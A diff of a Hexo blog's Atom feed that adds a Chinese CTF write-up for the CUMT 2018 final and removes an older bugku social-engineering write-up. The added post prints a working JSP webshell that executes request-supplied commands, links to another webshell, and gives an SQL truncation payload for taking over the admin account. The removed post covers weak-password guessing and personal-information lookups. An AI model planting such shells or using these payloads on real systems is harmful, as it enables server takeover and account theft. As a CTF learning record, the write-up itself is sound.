@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="0verwatch.top/"/>
-  <updated>2018-05-21T07:27:11.454Z</updated>
+  <updated>2018-05-21T15:11:34.141Z</updated>
   <id>0verwatch.top/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>cumt-2018-final</title>
+    <link href="0verwatch.top/2018/05/21/cumt-2018-final/"/>
+    <id>0verwatch.top/2018/05/21/cumt-2018-final/</id>
+    <published>2018-05-21T15:10:09.000Z</published>
+    <updated>2018-05-21T15:11:34.141Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为上学期进入了决赛，于是在上周六进行了决赛，感觉自己还是太渣，最后只能跟队友做了两道题目拿了个三等奖，还是记录一下解题过程吧</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Jerry’s-Site-1"><a href="#Jerry’s-Site-1" class="headerlink" title="Jerry’s Site 1"></a>Jerry’s Site 1</h3><p>这个题目一开始忘了扫后台目录，直到有了hint存在<code>admin后台</code>并且存在弱口令才开始解决这道题目了，以后没思路的时候还是要扫描一波后台啊。。。说不定就有特别的发现了啊<br>根据弱口令，尝试用户名密码都是<code>admin</code>进入后台</p><p><img src="https://s1.ax1x.com/2018/05/21/C2cVOJ.jpg" alt="C2cVOJ.jpg"><br>随便点点，发现有个地方有点意思，可以增加文件，就是文件管理模块，但是当时可能运维出了点问题，没有开写权限，所以卡住了很久，后来题目恢复了就不存在问题了。。。<br><img src="https://s1.ax1x.com/2018/05/21/C2cem9.jpg" alt="C2cem9.jpg"></p><p>因为这个题目抓包发现是<code>Tomcat</code>服务器，想到了上一次某某杯比赛里面一道类似的上传文件的题目<br>所以想到<code>Tomcat</code>就会想到这是<code>Java</code>写的网站，于是就上网找<code>jsp木马</code></p><p>这里放上当时我上传的jsp大马<br><a href="https://raw.githubusercontent.com/tennc/webshell/master/jsp/JFolder.jsp" target="_blank" rel="noopener">https://raw.githubusercontent.com/tennc/webshell/master/jsp/JFolder.jsp</a></p><p>然后访问木马文件，在上层目录可以找<code>flag.txt</code>，下载下来打开即可</p><p>当然也可以找小马<br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"023"</span>.equals(request.getParameter(<span class="string">"pwd"</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">"i"</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p>hackbar里面执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jerry.bxsteam.xyz/cms/sky.jsp?pwd=023&amp;i=ls</span><br></pre></td></tr></table></figure></p><p>发现同样发现<code>flag.txt</code>，<code>cat</code>一波即可。。。</p><p>得到flag<br><code>cumtctf{thi3_1s_first_F4l9_in_thi_web}</code></p><h3 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h3><p>这一道题目完全被提示带偏，说是二次注入，直接说是<code>SQL长度约束攻击</code>不就好了。。。。-_-||，这个题目手速快一点可能就有二等奖了<br>后来仔细想想，其实吧这也算是sql二次注入的一种。。。经过截断后再放进数据库里面搜索。。emmm</p><p>以前在bugku平台上做过一道类似的题目</p><p>直接在注册页面上注册下面的内容<br>我的payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin                                                       &apos;</span><br><span class="line">password:123</span><br></pre></td></tr></table></figure><p>注意payload里面的如何利用空格去截断</p><p>注册完后跳转到登录页面，此时你就是<code>admin</code>用户了。。。<br>点击下面随意一个链接，得到flag</p><p>·cumtctf{easy_injection_for_fun}·</p><p>##结语<br>希望以后慢慢进步，变得更强吧。。<br>大佬们以后轻点虐。。。我进步得太慢。。。</p><p>web的全部wp:<a href="http://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/" target="_blank" rel="noopener">http://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;因为上学期进入了决赛，于是在上周六进行了决赛，感觉自己还是太渣，最后只能跟队友做了两道题目拿了个三等奖，还是记录一下解题过程吧&lt;/p&gt;
+&lt;h
+      
+    
+    </summary>
+    
+      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
+    
+    
+      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
+    
+      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
+    
+  </entry>
   
   <entry>
     <title>Git学习笔记</title>
@@ -476,30 +504,6 @@
       <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
     
       <category term="Crypto" scheme="0verwatch.top/tags/Crypto/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>bugku Social write up</title>
-    <link href="0verwatch.top/2018/02/08/bugku-social-wp/"/>
-    <id>0verwatch.top/2018/02/08/bugku-social-wp/</id>
-    <published>2018-02-08T06:16:20.000Z</published>
-    <updated>2018-05-20T11:05:00.255Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="密码？？？"><a href="#密码？？？" class="headerlink" title="密码？？？"></a>密码？？？</h2><p>根据提示直接猜测密码为zs19970315，尝试成功<br><img src="https://s1.ax1x.com/2018/05/20/CggIFx.png" alt="CggIFx.png"><br><a id="more"></a></p><h2 id="域名解析？"><a href="#域名解析？" class="headerlink" title="域名解析？"></a>域名解析？</h2><p>直接改本地的host文件，win10的话在’C:\Windows\System32\drivers\etc’目录下，记得用管理权限打开<br>里面添加一行120.24.86.145  flag.bugku.com<br>然后浏览器打开flag.bugku.com获得key<br><img src="https://s1.ax1x.com/2018/05/20/CggTfK.png" alt="CggTfK.png"></p><h2 id="信息查找？？？"><a href="#信息查找？？？" class="headerlink" title="信息查找？？？"></a>信息查找？？？</h2><p>百度找到网页：<code>http://www.xiukee.com/show_356966.html</code><br>有个提示是flag是群号码，那我就试一下群号码试就行了，成功过关</p><h2 id="简单个人信息收集"><a href="#简单个人信息收集" class="headerlink" title="简单个人信息收集"></a>简单个人信息收集</h2><p>把压缩包下载下来之后发现是伪加密，拖进HXD中查找16进制，<br><img src="https://s1.ax1x.com/2018/05/20/Cggq6e.png" alt="Cggq6e.png"><br>把图中红色的09改为00，因为基数是伪加密。<br>可参考：<a href="http://0verwatch.top/2018/02/08/zipfalse/">http://0verwatch.top/2018/02/08/zipfalse/</a><br>打开压缩包发现一个txt文件，叫我寻找下图的信息，<br><img src="https://s1.ax1x.com/2018/05/20/Cg2lX4.png" alt="Cg2lX4.png"><br>翻墙找个社工库查一查，但很多社工库都挂掉了，我直接看的别人的wp得到的结果。。。<br>手机号码是15206164164</p><h2 id="入门题目，社工帝？"><a href="#入门题目，社工帝？" class="headerlink" title="入门题目，社工帝？"></a>入门题目，社工帝？</h2><p>给了个名字给我，上谷歌一句搜索命令：intitle:孤长离，第一个就是它的贴吧<br><img src="https://s1.ax1x.com/2018/05/20/Cg23nJ.png" alt="Cg23nJ.png"><br>里面有个163的邮箱，又根据提示是弱口令，百度弱口令，一个个试，因为163邮箱有验证码就不能用bp去爆破，还是手动试吧，我试到第二个就是了。<br>在里面找到flag<br><img src="https://s1.ax1x.com/2018/05/20/Cg2Nh6.png" alt="Cg2Nh6.png"></p><h2 id="简单的社工尝试"><a href="#简单的社工尝试" class="headerlink" title="简单的社工尝试"></a>简单的社工尝试</h2><p>拿到一个图片邮件啥东西都没有，只能去binwalk一下了，发现里面有个压缩包，打开一看啥都没有<br>又看了看题目，说是头像，这时候意识到自己想错方向了，不应该往misc方向想的<br>于是乎就用百度识图看一看。。又是什么都没有。。。。<br><a href="https://imgchr.com/i/Cg2a9K" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/Cg2a9K.md.png" alt="Cg2a9K.md.png"></a><br>再来谷歌识图，这次找到一个github上的bugku，翻来翻去还是没找到flag<br>最后发现一个微博链接，<br><img src="https://s1.ax1x.com/2018/05/20/Cg2d1O.png" alt="Cg2d1O.png"><br>点进去发现一个醒目的图片<br><img src="https://s1.ax1x.com/2018/05/20/Cg2wcD.png" alt="Cg2wcD.png"><br>再打开一看，bingo找到flag<br><img src="https://s1.ax1x.com/2018/05/20/Cg2DnH.png" alt="Cg2DnH.png"></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;密码？？？&quot;&gt;&lt;a href=&quot;#密码？？？&quot; class=&quot;headerlink&quot; title=&quot;密码？？？&quot;&gt;&lt;/a&gt;密码？？？&lt;/h2&gt;&lt;p&gt;根据提示直接猜测密码为zs19970315，尝试成功&lt;br&gt;&lt;img src=&quot;https://s1.ax1x.com/2018/05/20/CggIFx.png&quot; alt=&quot;CggIFx.png&quot;&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
-    
-    
-      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
-    
-      <category term="Social" scheme="0verwatch.top/tags/Social/"/>
     
   </entry>
   
